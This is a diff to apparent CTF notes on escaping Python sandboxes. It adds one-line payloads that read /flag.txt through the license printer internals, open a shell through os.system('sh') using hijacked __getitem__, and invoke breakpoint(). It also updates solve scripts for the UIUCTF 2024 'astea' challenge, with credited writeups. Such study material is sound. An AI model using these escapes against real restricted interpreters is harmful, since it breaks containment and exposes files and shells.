@@ -63,8 +63,7 @@ help(*open("/flag.txt"))
 print(*open("/flag.txt")
 
 # https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#read-file-with-builtins-help-and-license
-license._Printer__filenames = ['/flag.txt']
-license()
+license._Printer__filenames = ['/flag.txt']; license()
 # [license() for license._Printer__filenames in [['/flag.txt']]]
 ```
 
@@ -264,6 +263,9 @@ obj = cobj()
 # list comprehension
 [+obj for obj.__class__.__pos__ in ["".__class__.__subclasses__]][0]
 [obj["print(123)"] for obj.__class__.__getitem__ in [eval]][0]
+
+# from builtin modules
+[f"{license}" for license._Printer__setup in [breakpoint]]
 ```
 
 ### deleting variables
@@ -362,7 +364,6 @@ class CoolDownTea(ast.NodeTransformer):
 code = input('Nothing is quite like a cup of tea in the morning: ').splitlines()[0]
 
 cup = ast.parse(code)
-print(ast.dump(cup, indent=4))
 cup = CoolDownTea().visit(cup)
 ast.fix_missing_locations(cup)
 
@@ -370,9 +371,23 @@ exec(compile(cup, '', 'exec'), {'__builtins__': {}}, {'safe_import': safe_import
 ```
 - `solve.py`
 ```py
-(a:=lambda:..., b:=safe_import.__builtins__["help"]); a.__globals__["__builtins__"] |= {"safe_import": safe_import, "safe_call": safe_call, "help": b}; [help["sh"] for help.__class__.__getitem__ in [help["os"].system for help.__class__.__getitem__ in [safe_import.__builtins__["__import__"]]]]
+# (a:=lambda:..., b:=safe_import.__builtins__["help"]); a.__globals__["__builtins__"] |= {"safe_import": safe_import, "safe_call": safe_call, "help": b}; [help["sh"] for help.__class__.__getitem__ in [help["os"].system for help.__class__.__getitem__ in [safe_import.__builtins__["__import__"]]]]
+__builtins__ |= safe_import.__builtins__;
+[help["sh"] for help.__class__.__getitem__ in [help["os"].system for help.__class__.__getitem__ in [safe_import.__builtins__["__import__"]]]]
 
-(a:=lambda:..., b:=safe_import.__builtins__["help"]); __builtins__ |= safe_import.__builtins__; [help["sh"] for help.__class__.__getitem__ in [help["os"].system for help.__class__.__getitem__ in [safe_import.__builtins__["__import__"]]]]
+# @ChattyPlatinumCool - https://medium.com/@harryfyx/writeup-uiuctf-2024-astea-7b27ec0b9159
+[license := safe_import.__globals__['__builtins__'].license];
+license._Printer__filenames += ['flag.txt'];
+[safe_call := license._Printer__filenames.reverse];
+safe_call();
+[safe_import := license];
+import sys
+
+# @WorldWideFlags - https://yun.ng/c/ctf/2024-uiuctf/misc/astea
+builtins: "" = safe_import.__globals__["__builtins__"];
+license: "" = builtins.license;
+license._Printer__setup: "" = builtins.breakpoint;
+f"{license}"
 ```
 
 ### vsCTF 2024: llama-jail-revenge
